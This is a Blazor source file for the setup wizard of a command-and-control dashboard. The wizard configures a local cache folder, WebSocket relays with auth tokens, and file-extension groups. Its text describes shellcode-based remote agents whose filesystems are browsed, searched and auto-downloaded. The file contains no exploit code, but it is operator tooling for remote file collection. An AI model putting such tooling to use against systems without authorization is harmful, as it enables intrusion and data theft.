@inject CacheManager Cache
@inject RelayStore Relay
@inject ExtensionGroupStore ExtGroups
@inject MessageService Msg

<div class="su">
    @* Sidebar *@
    <div class="su-sidebar">
        <div class="su-brand">
            <span class="su-logo">C2</span>
            <span class="su-brand-name">Command & Control</span>
        </div>

        <nav class="su-nav">
            @foreach (var s in orderedSteps)
            {
                var navStep = s;
                <button class="su-nav-item @(step == navStep ? "active" : "") @(IsStepDone(navStep) ? "done" : "") @(!CanNavigateTo(navStep) ? "locked" : "")"
                        @onclick="() => GoToStep(navStep)" disabled="@(!CanNavigateTo(navStep))">
                    <span class="su-nav-num">@StepNumber(navStep)</span>
                    <span class="su-nav-label">@StepLabel(navStep)</span>
                    @if (IsStepDone(navStep)) { <span class="su-nav-check"><C2Icon Name="check" Size="Size.Xs" /></span> }
                </button>
            }
        </nav>

        <div class="su-sidebar-footer">
            <span class="su-footer-text">Initial setup &mdash; configure your environment before getting started.</span>
        </div>
    </div>

    @* Main content *@
    <div class="su-main">
        <div class="su-content">
            @if (step == Step.Welcome)
            {
                <h2 class="su-title">Welcome to C2</h2>
                <p class="su-desc">C2 is a command center dashboard built with Blazor WebAssembly (.NET 10). It connects to remote agents through a WebSocket relay and provides a real-time interface for browsing filesystems, searching files, and downloading data to a local cache.</p>

                <div class="su-section-label">How it works</div>
                <div class="su-features">
                    @foreach (var item in HowItWorks)
                    {
                        <div class="su-feature">
                            <span class="su-feature-icon"><C2Icon Name="@item.Icon" Size="Size.Md" /></span>
                            <div class="su-feature-text">
                                <strong>@item.Title</strong>
                                <span>@item.Desc</span>
                            </div>
                        </div>
                    }
                </div>

                <div class="su-section-label">Features</div>
                <div class="su-features">
                    @foreach (var item in Features)
                    {
                        <div class="su-feature">
                            <span class="su-feature-icon"><C2Icon Name="@item.Icon" Size="Size.Md" /></span>
                            <div class="su-feature-text">
                                <strong>@item.Title</strong>
                                <span>@item.Desc</span>
                            </div>
                        </div>
                    }
                </div>

                <div class="su-section-label">Repositories</div>
                <div class="su-links">
                    @foreach (var link in RepoLinks)
                    {
                        <a class="su-link" href="@link.Url" target="_blank" rel="noopener">
                            <span class="su-link-icon"><C2Icon Name="@link.Icon" Size="Size.Xs" /></span> @link.Label
                        </a>
                    }
                </div>

                <div class="su-actions">
                    <C2Btn Variant="BtnVariant.Primary" Size="Size.Lg" OnClick="Advance">Get Started</C2Btn>
                </div>
            }
            else if (step == Step.Cache)
            {
                <h2 class="su-title">Cache Storage</h2>
                @if (!Cache.IsSupported)
                {
                    <div class="su-info-box su-info-box-danger">
                        <span class="su-info-icon"><C2Icon Name="alert-triangle" Size="Size.Md" /></span>
                        <div class="su-info-text">
                            <strong>Browser not supported</strong>
                            <span>Your browser does not support the File System Access API. A cache folder is required for C2 to function. Please use a Chromium-based browser (Chrome, Edge, Brave).</span>
                        </div>
                    </div>
                }
                else if (Cache.NeedsPermission)
                {
                    <p class="su-desc">Your previously selected cache folder needs permission to be re-granted. A cache folder is required for storing downloaded agent files.</p>
                    <div class="su-actions">
                        <C2Btn Variant="BtnVariant.Primary" Size="Size.Lg" OnClick="ReGrantPermission" Disabled="@picking" Loading="@picking">Grant Access</C2Btn>
                        <C2Btn Size="Size.Md" OnClick="PickFolder" Disabled="@picking">Pick Different Folder</C2Btn>
                    </div>
                }
                else
                {
                    <p class="su-desc">Select a folder on your device to use as the local file cache. This is required &mdash; all files downloaded from agents are stored here for offline browsing, searching, and analysis.</p>
                    <div class="su-info-box">
                        <span class="su-info-icon"><C2Icon Name="folder" Size="Size.Md" /></span>
                        <div class="su-info-text">
                            <strong>Why a cache folder?</strong>
                            <span>C2 stores agent data locally on your machine. Downloaded files, filesystem metadata, and search results all require a cache directory. Choose a folder with enough free space.</span>
                        </div>
                    </div>
                    <div class="su-actions">
                        <C2Btn Variant="BtnVariant.Primary" Size="Size.Lg" OnClick="PickFolder" Disabled="@picking" Loading="@picking">Select Cache Folder</C2Btn>
                    </div>
                }
            }
            else if (step == Step.Relay)
            {
                <h2 class="su-title">Relay Servers</h2>
                <p class="su-desc">Configure the relay servers that agents connect through. The relay acts as a bridge between this dashboard and your deployed agents. You can add multiple relays.</p>

                @if (Relay.Relays.Count > 0)
                {
                    <div class="su-section-label">Configured relays</div>
                    <div class="su-relay-list">
                        @foreach (var r in Relay.Relays)
                        {
                            var relay = r;
                            <div class="su-relay-item @(relay.Enabled ? "su-relay-enabled" : "")">
                                <div class="su-relay-info">
                                    <span class="su-relay-name">@relay.Name</span>
                                    <span class="su-relay-url">@relay.Url</span>
                                    <span class="su-relay-token">Token: @(string.IsNullOrEmpty(relay.Token) ? "not set" : "configured")</span>
                                </div>
                                <div class="su-relay-actions">
                                    <C2Btn Size="Size.Xs" OnClick="() => EditRelay(relay)" Title="Edit">EDIT</C2Btn>
                                    <C2Btn Size="Size.Xs"
                                           Variant="@(relay.Enabled ? BtnVariant.Warning : BtnVariant.Success)"
                                           OnClick="() => ToggleRelay(relay)"
                                           Title="@(relay.Enabled ? "Disable" : "Enable")">
                                        @(relay.Enabled ? "OFF" : "ON")
                                    </C2Btn>
                                    @if (Relay.Relays.Count > 1)
                                    {
                                        <button class="su-ext-remove" @onclick="() => RemoveRelay(relay)" title="Remove"><C2Icon Name="x" Size="Size.Xs" /></button>
                                    }
                                </div>
                            </div>
                        }
                    </div>
                }

                <div class="su-section-label">@(editingRelay is not null ? "Edit relay" : "Add relay")</div>
                <div class="su-form">
                    <div class="su-field">
                        <label class="su-label">Relay Name</label>
                        <C2Input @bind-Value="relayName" Size="Size.Md" Placeholder="My Relay" />
                    </div>
                    <div class="su-field">
                        <label class="su-label">Relay URL</label>
                        <C2Input @bind-Value="relayUrl" Size="Size.Md" Placeholder="wss://relay.example.com" Monospace Disabled="@(editingRelay is not null)" />
                        <span class="su-field-hint">Must start with wss:// or ws://</span>
                    </div>
                    <div class="su-field">
                        <label class="su-label">Auth Token</label>
                        <C2Input @bind-Value="relayToken" Size="Size.Md" Placeholder="Bearer token for relay authentication" Monospace Type="password" />
                        <span class="su-field-hint">Required for authenticated relay servers</span>
                    </div>
                </div>

                <div class="su-actions">
                    @if (editingRelay is not null)
                    {
                        <C2Btn Variant="BtnVariant.Primary" Size="Size.Md" OnClick="UpdateRelay" Disabled="@saving" Loading="@saving">Update Relay</C2Btn>
                        <C2Btn Size="Size.Md" OnClick="CancelEditRelay">Cancel</C2Btn>
                    }
                    else
                    {
                        <C2Btn Variant="BtnVariant.Primary" Size="Size.Md" OnClick="AddRelay" Disabled="@saving" Loading="@saving">Add Relay</C2Btn>
                    }
                </div>

                @if (Relay.EnabledRelays.Count > 0)
                {
                    <div class="su-actions" style="margin-top: 1rem;">
                        <C2Btn Variant="BtnVariant.Primary" Size="Size.Lg" OnClick="Advance">Continue</C2Btn>
                    </div>
                }
                else
                {
                    <p class="su-hint">At least one enabled relay is required to continue.</p>
                }
            }
            else if (step == Step.Extensions)
            {
                <h2 class="su-title">File Extension Groups</h2>
                <p class="su-desc">Choose which file types to look for when searching agent filesystems. Click a group to toggle it. You can also add your own custom groups below.</p>

                <div class="su-section-label">Default groups</div>
                <div class="su-ext-groups">
                    @foreach (var group in ExtensionGroupStore.DefaultGroups)
                    {
                        var g = group;
                        var isActive = selectedExtGroups.Contains(g.Key);
                        <button class="su-ext-group @(isActive ? "active" : "")" @onclick="() => ToggleExtGroup(g.Key)">
                            <div class="su-ext-group-top">
                                @if (isActive) { <span class="su-ext-group-check"><C2Icon Name="check" Size="Size.Xs" /></span> }
                                <span class="su-ext-group-name">@g.Key</span>
                            </div>
                            <span class="su-ext-group-exts">@string.Join(", ", g.Value)</span>
                        </button>
                    }
                </div>

                @if (customGroups.Count > 0)
                {
                    <div class="su-section-label">Custom groups</div>
                    <div class="su-ext-groups">
                        @foreach (var cg in customGroups)
                        {
                            var c = cg;
                            <div class="su-ext-group active">
                                <div class="su-ext-group-top">
                                    <span class="su-ext-group-check"><C2Icon Name="check" Size="Size.Xs" /></span>
                                    <span class="su-ext-group-name">@c.Name</span>
                                    <button class="su-ext-remove" @onclick="() => RemoveCustomGroup(c.Name)" title="Remove"><C2Icon Name="x" Size="Size.Xs" /></button>
                                </div>
                                <span class="su-ext-group-exts">@c.Extensions</span>
                            </div>
                        }
                    </div>
                }

                <div class="su-section-label">Add custom group</div>
                <div class="su-custom-form">
                    <div class="su-custom-row">
                        <C2Input @bind-Value="customGroupName" Placeholder="Group name (e.g. Audio)" Size="Size.Sm" />
                        <C2Input @bind-Value="customGroupExts" Placeholder="Extensions (e.g. .mp3,.wav,.flac)" Size="Size.Sm" Monospace />
                        <C2Btn Variant="BtnVariant.Primary" Size="Size.Xs" OnClick="AddCustomGroup">ADD</C2Btn>
                    </div>
                    @if (!string.IsNullOrEmpty(customGroupError))
                    {
                        <div class="su-custom-error">@customGroupError</div>
                    }
                </div>

                <div class="su-actions">
                    <C2Btn Variant="BtnVariant.Primary" Size="Size.Lg" OnClick="SaveExtensions" Disabled="@saving" Loading="@saving">Finish Setup</C2Btn>
                    <C2Btn Size="Size.Md" OnClick="SaveAllExtensions" Disabled="@saving">Select All & Finish</C2Btn>
                </div>

                <p class="su-hint">You can modify these later from the Extensions panel.</p>
            }
        </div>
    </div>
</div>

@code {
    [Parameter] public EventCallback OnComplete { get; set; }

    private enum Step { Welcome, Cache, Relay, Extensions }

    private Step step;
    private bool picking;
    private bool saving;
    private string relayName = "";
    private string relayUrl = "";
    private string relayToken = "";
    private RelayRecord? editingRelay;
    private HashSet<string> selectedExtGroups = new(ExtensionGroupStore.DefaultGroups.Keys);
    private HashSet<Step> completedSteps = new();
    private List<(string Name, string Extensions)> customGroups = new();
    private string customGroupName = "";
    private string customGroupExts = "";
    private string customGroupError = "";
    private List<Step> orderedSteps = [];

    private record InfoItem(string Icon, string Title, string Desc);
    private record LinkItem(string Icon, string Label, string Url);

    private static readonly InfoItem[] HowItWorks =
    [
        new("laptop", "Agent", "Cross-platform remote agent built on PIR (Position-Independent Runtime) \u2014 a zero-dependency C++23 shellcode runtime with cryptography, networking, and TLS 1.3. Communicates via a binary command protocol over WebSocket."),
        new("globe", "Relay", "WebSocket relay running on Cloudflare Workers with Durable Objects. Pairs agents with dashboard connections 1:1 \u2014 no direct inbound connections to agents needed."),
        new("monitor", "C2 (this dashboard)", "Blazor WebAssembly app that runs entirely in your browser. Connects to the relay, sends commands to agents, and caches downloaded files locally using the File System Access API and IndexedDB."),
    ];

    private static readonly InfoItem[] Features =
    [
        new("folder", "Remote File Browser", "Navigate agent filesystems, view file contents, and upload files to the local cache."),
        new("search", "File Search", "Recursively search entire filesystems by file extension with configurable extension groups and auto-download."),
        new("save", "Local-only Storage", "All data stays on your machine. Files are cached to a local folder, metadata is stored in IndexedDB. Nothing is sent to external servers."),
    ];

    private static readonly LinkItem[] RepoLinks =
    [
        new("monitor", "C2 Dashboard", "https://github.com/mrzaxaryan/C2"),
        new("globe", "Relay Server", "https://github.com/mrzaxaryan/relay"),
        new("laptop", "Agent", "https://github.com/mrzaxaryan/Position-Independent-Agent"),
        new("cog", "PIR Runtime", "https://github.com/mrzaxaryan/Position-Independent-Runtime"),
    ];

    private static readonly Dictionary<Step, string> StepLabels = new()
    {
        [Step.Welcome] = "Welcome",
        [Step.Cache] = "Cache Storage",
        [Step.Relay] = "Relay Server",
        [Step.Extensions] = "File Extensions",
    };

    protected override void OnInitialized()
    {
        var needsCache = Cache.SetupRequired || Cache.NeedsPermission;
        var needsRelay = Relay.SetupRequired;
        var needsExtensions = ExtGroups.SetupRequired;

        orderedSteps = [Step.Welcome];
        if (needsCache) orderedSteps.Add(Step.Cache);
        if (needsRelay) orderedSteps.Add(Step.Relay);
        if (needsExtensions) orderedSteps.Add(Step.Extensions);

        step = Step.Welcome;

        var enabled = Relay.EnabledRelays.FirstOrDefault();
        relayName = enabled?.Name ?? (needsRelay ? RelayStore.DefaultName : "");
        relayUrl = enabled?.Url ?? (needsRelay ? RelayStore.DefaultUrl : "");
        relayToken = enabled?.Token ?? (needsRelay ? RelayStore.DefaultToken : "");
    }

    private static string StepLabel(Step s) => StepLabels.GetValueOrDefault(s, s.ToString());

    private int StepNumber(Step s) => orderedSteps.IndexOf(s) + 1;

    private bool IsStepDone(Step s) => completedSteps.Contains(s);

    private bool CanNavigateTo(Step s)
    {
        if (s == step || IsStepDone(s)) return true;
        foreach (var prev in orderedSteps)
        {
            if (prev == s) return true;
            if (!IsStepDone(prev)) return false;
        }
        return false;
    }

    private void GoToStep(Step s)
    {
        if (CanNavigateTo(s)) step = s;
    }

    private void Advance()
    {
        completedSteps.Add(step);
        var idx = orderedSteps.IndexOf(step);
        if (idx + 1 < orderedSteps.Count)
        {
            step = orderedSteps[idx + 1];
            StateHasChanged();
        }
        else
        {
            OnComplete.InvokeAsync();
        }
    }

    private async Task ReGrantPermission()
    {
        picking = true;
        StateHasChanged();
        try
        {
            var success = await Cache.ReRequestPermissionAsync();
            if (success) Advance();
            else Msg.Error("Permission Denied", "Storage permission was denied. Try again or pick a different folder.", "Setup");
        }
        catch (Exception ex) { Msg.Error("Permission Error", ex.Message, "Setup"); }
        finally { picking = false; }
    }

    private async Task PickFolder()
    {
        picking = true;
        StateHasChanged();
        try
        {
            var success = await Cache.PickDirectoryAsync();
            if (success) Advance();
            else Msg.Warn("No Folder Selected", "Please pick a storage folder to continue.", "Setup");
        }
        catch (Exception ex) { Msg.Error("Folder Selection Error", ex.Message, "Setup"); }
        finally { picking = false; }
    }

    private async Task AddRelay()
    {
        var name = relayName.Trim();
        var url = relayUrl.Trim().TrimEnd('/');

        if (string.IsNullOrEmpty(url)) { Msg.Error("Validation Error", "Relay URL is required.", "Setup"); return; }
        if (!url.StartsWith("wss://") && !url.StartsWith("ws://")) { Msg.Error("Validation Error", "URL must start with wss:// or ws://", "Setup"); return; }
        if (string.IsNullOrEmpty(name)) name = url;
        if (Relay.Relays.Any(r => r.Url == url)) { Msg.Error("Duplicate Relay", "A relay with this URL already exists.", "Setup"); return; }

        saving = true;
        StateHasChanged();
        try
        {
            await Relay.AddRelay(name, url, relayToken.Trim());
            await Relay.SetEnabled(url, true);
            relayName = "";
            relayUrl = "";
            relayToken = "";
        }
        catch (Exception ex) { Msg.Error("Add Relay Failed", ex.Message, "Setup"); }
        finally { saving = false; }
    }

    private void EditRelay(RelayRecord relay)
    {
        editingRelay = relay;
        relayName = relay.Name;
        relayUrl = relay.Url;
        relayToken = relay.Token;
    }

    private async Task UpdateRelay()
    {
        if (editingRelay is null) return;
        var name = relayName.Trim();
        if (string.IsNullOrEmpty(name)) name = editingRelay.Url;

        saving = true;
        StateHasChanged();
        try
        {
            await Relay.UpdateRelay(editingRelay.Url, name, editingRelay.Url, relayToken.Trim());
            CancelEditRelay();
        }
        catch (Exception ex) { Msg.Error("Update Relay Failed", ex.Message, "Setup"); }
        finally { saving = false; }
    }

    private void CancelEditRelay()
    {
        editingRelay = null;
        relayName = "";
        relayUrl = "";
        relayToken = "";
    }

    private async Task ToggleRelay(RelayRecord relay)
    {
        await Relay.SetEnabled(relay.Url, !relay.Enabled);
        StateHasChanged();
    }

    private async Task RemoveRelay(RelayRecord relay)
    {
        await Relay.RemoveRelay(relay.Url);
        if (editingRelay?.Url == relay.Url) CancelEditRelay();
        StateHasChanged();
    }

    private void ToggleExtGroup(string name)
    {
        if (!selectedExtGroups.Remove(name))
            selectedExtGroups.Add(name);
    }

    private void AddCustomGroup()
    {
        var name = customGroupName.Trim();
        var exts = customGroupExts.Trim();

        if (string.IsNullOrEmpty(name)) { customGroupError = "Group name is required."; return; }
        if (string.IsNullOrWhiteSpace(exts)) { customGroupError = "At least one extension is required."; return; }

        if (ExtensionGroupStore.DefaultGroups.ContainsKey(name) || customGroups.Any(g => g.Name.Equals(name, StringComparison.OrdinalIgnoreCase)))
        {
            customGroupError = $"A group named '{name}' already exists.";
            return;
        }

        var normalized = ExtensionGroupStore.NormalizeExtensions(exts);
        var invalid = ExtensionGroupStore.GetInvalidExtensions(normalized);
        if (invalid.Count > 0)
        {
            customGroupError = $"Invalid: {string.Join(", ", invalid)} — must be dot + 1-15 alphanumeric characters.";
            return;
        }
        customGroups.Add((name, normalized));
        customGroupName = "";
        customGroupExts = "";
        customGroupError = "";
    }

    private void RemoveCustomGroup(string name)
    {
        customGroups.RemoveAll(g => g.Name == name);
    }

    private async Task SaveExtensions()
    {
        saving = true;
        StateHasChanged();
        try
        {
            foreach (var (name, exts) in ExtensionGroupStore.DefaultGroups)
                await ExtGroups.AddAsync(name, string.Join(",", exts), selectedExtGroups.Contains(name));
            foreach (var (name, exts) in customGroups)
                await ExtGroups.AddAsync(name, exts, true);
            completedSteps.Add(Step.Extensions);
            await OnComplete.InvokeAsync();
        }
        catch (Exception ex) { Msg.Error("Save Extensions Failed", ex.Message, "Setup"); }
        finally { saving = false; }
    }

    private async Task SaveAllExtensions()
    {
        selectedExtGroups = new HashSet<string>(ExtensionGroupStore.DefaultGroups.Keys);
        await SaveExtensions();
    }
}
